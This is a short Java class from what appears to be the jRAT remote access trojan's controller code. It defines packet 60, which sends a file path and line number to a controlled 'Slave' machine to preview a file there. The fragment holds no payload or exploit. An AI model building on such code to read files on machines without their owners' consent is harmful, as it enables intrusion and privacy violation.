package jrat.module.fs.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.AbstractOutgoingPacket;


public class Packet60PreviewFile extends AbstractOutgoingPacket {

	private String file;
	private int line;

	public Packet60PreviewFile(String file, int line) {
		this.file = file;
		this.line = line;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(file);
		slave.writeInt(line);
	}

	@Override
	public short getPacketId() {
		return 60;
	}

}
